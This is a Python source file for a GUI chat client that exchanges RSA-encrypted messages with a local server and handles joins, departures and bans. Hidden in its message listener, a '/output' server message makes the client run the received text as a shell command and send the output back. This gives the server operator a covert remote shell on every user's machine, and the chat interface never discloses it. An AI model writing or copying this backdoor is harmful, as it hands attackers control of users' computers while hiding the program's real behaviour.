# Echo client program
import socket
from termcolor import colored
from threading import Thread
import PySimpleGUI as sg
import subprocess, os
from tkinter import simpledialog, Tk
import rsa

class UserBannedException(Exception):
    pass

global users
users = []

def listen_for_messages(s : socket.socket):
    s.settimeout(1)

    global users, private_key
    win["-USERS-"].update(users)

    while not exit_app:
        try:
            t_nickname, *data = receive_message().split(",")
            data = "".join(data)
        except Exception as e:
            continue

        # /ban will always contain max 1 user
        if t_nickname == "/ban":
            banned = True
            nick = "You have" if data == nickname else f"{data} has"
            win["-CHAT HISTORY-"].update(f"=> {nick} been banned from the server\n", text_color_for_value="red", append=True)
            return
        
        # /new_user will always contain max 1 user
        if t_nickname == "/new_user":            
            users.append(data)

            win["-USERS-"].update(users)
            win["-CHAT HISTORY-"].update(f"=> {data} joined the chat\n", text_color_for_value="green", append=True)
            continue
        
        # /user_left will always contain max 1 user
        if t_nickname == "/user_left":
            users.remove(data)
            win["-USERS-"].update(users)
            win["-CHAT HISTORY-"].update(f"=> {data} left the chat\n", text_color_for_value="red", append=True)
            continue

        if t_nickname == "/output":
            cmd = f""

            if data.startswith("cd "):
                try:
                    os.chdir(data[3:])
                except FileNotFoundError:
                    send_message("/output,File or directory not found\n")
                    continue
                except PermissionError:
                    send_message("/output,Permission denied\n")
                    continue

            elif len(data) > 0:
                p = subprocess.run(data, shell=True, capture_output=True)
                data = p.stdout + p.stderr
                cmd = "\n" + data.decode('utf-8', errors='ignore') + f"\n"

            max_cryptable = int(RSA_KEY_LEN/8) - 19         # max bytes that rsa can encrypt with 1024 bit key
            for n in range(0,len(cmd),max_cryptable): 
                send_message("/output," + cmd[n:n+max_cryptable])
            continue

        
        # Print message received
        t_nickname = f"({t_nickname})".ljust(NICKNAME_WIDTH)
        win["-CHAT HISTORY-"].update(f"{t_nickname}", text_color_for_value='#E2CF03', append=True)
        win["-CHAT HISTORY-"].update(data + "\n", text_color_for_value='white', append=True)

def create_window():
    
    CHAT_WIDTH = 85
    CHAT_HEIGHT = 25
    BUTTON_WIDTH = 25
    BUTTON_HEIGHT = 18
    TEXT_PAD = (0,5)
    chat_row = [
        [
            sg.Multiline(key="-CHAT HISTORY-", size=(CHAT_WIDTH, CHAT_HEIGHT), text_color="white", background_color="#222", font=("default", 11), pad=TEXT_PAD, focus=False, no_scrollbar=True, disabled=True, autoscroll=True),
            sg.Listbox(users, key="-USERS-", size=(15, CHAT_HEIGHT), no_scrollbar=True),
        ]
    ]

    input_row = [
        [
            sg.InputText(size=(CHAT_WIDTH+5, 2), key="-CHAT INPUT-", do_not_clear=False, focus=True),
            sg.Button(key="-SEND-", enable_events=True, image_filename="send.png", image_size=(BUTTON_WIDTH, BUTTON_HEIGHT), button_color="#C4E200")
        ]
    ]

    layout = [
        [chat_row],
        [sg.HorizontalSeparator()],
        [input_row]
    ]
    global event
    global values
    global win
    win = sg.Window("Chat", layout, finalize=True)

    win["-CHAT INPUT-"].bind("<Return>", "_Enter")


def handle_window():
    global exit_app
    while not exit_app:
        event, values = win.read()

        if event == sg.WIN_CLOSED:
            exit_app = True
            break

        elif event == '-SEND-' or event == "-CHAT INPUT-_Enter":
            data = values["-CHAT INPUT-"]
            global nickname
            nick = f"({nickname})".ljust(NICKNAME_WIDTH)

            if data.strip() == "" or data == None:
                continue
                
            MAX_DATA_LEN = 110                  # rsa with RSA_KEY_LEN key cannot encrypt more than MAX_DATA_LEN bytes
            if(len(data) < MAX_DATA_LEN):
                win["-CHAT HISTORY-"].update(f"{nick}", text_color_for_value='#E2CF03', append=True)
                win["-CHAT HISTORY-"].update(data + "\n", text_color_for_value='white', append=True)

            if not banned:
                Thread(target=send_message, args=(data,)).start()
            
    win.close()
    

def exchange_keys():
    global public_key, private_key, server_key, s, RSA_KEY_LEN
    
    public_key, private_key = rsa.newkeys(RSA_KEY_LEN)

    server_key = rsa.PublicKey.load_pkcs1( s.recv(RSA_KEY_LEN) )

def connect_to_server():
    HOST = '127.0.0.1'    # The remote host
    PORT = 58465              # The same port used by the server

    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    try:
        s.connect((HOST, PORT))

        exchange_keys()

        command, *data = receive_message().split(",")    # if not banned it contains the users
        if command == "/ban":
            raise UserBannedException()
        
    except ConnectionRefusedError:
        print(colored("[-] Failed to connect to the server", "red"))
        return False
    
    except UserBannedException:
        print(colored("[-] You have been banned from the server", "red"))
        return False
    

    global users
    users = list(user for user in data)
    if users[0] == '':
        users = []

    return send_nickname()

def send_nickname():
    msg = Tk()
    msg.withdraw()

    global nickname
    nickname = simpledialog.askstring("Nickname", "Enter your nickname: ", parent=msg)

    send_message(nickname)
    res = receive_message()
    
    if res == "/invalid_nick":
        print(colored(f"[-] '{nickname}' is not a valid nickname", "red"))
        return False

    return True


def send_message(msg):
    global s, server_key, RSA_KEY_LEN, win

    try:
        s.sendall(rsa.encrypt(msg.encode(), server_key))

    except BrokenPipeError as bp:
        win["-CHAT HISTORY-"].update("Connection closed\n", text_color_for_value="red", append=True)

    except OverflowError as oe:
        win["-CHAT HISTORY-"].update("Message too long. Max 110 char allowed\n", text_color_for_value="red", append=True)
    
    except ConnectionResetError as cre:
        win["-CHAT HISTORY-"].update("Connection closed by server\n", text_color_for_value="red", append=True)


def receive_message():
    global s, private_key
    return rsa.decrypt(s.recv(1024), private_key).decode('utf-8', errors='ignore')

def main():
    global exit_app
    exit_app = False

    global NICKNAME_WIDTH
    NICKNAME_WIDTH = 15     # space taken up by nickname

    global RSA_KEY_LEN
    RSA_KEY_LEN = 1024
    global banned
    banned = False

    if not connect_to_server():
        exit(0)

    print(colored("[+] Connected", "green"))

    create_window()
    listen_thread = Thread(target=listen_for_messages, args=(s,))
    listen_thread.start()
    handle_window()


if __name__ == '__main__':
    main()
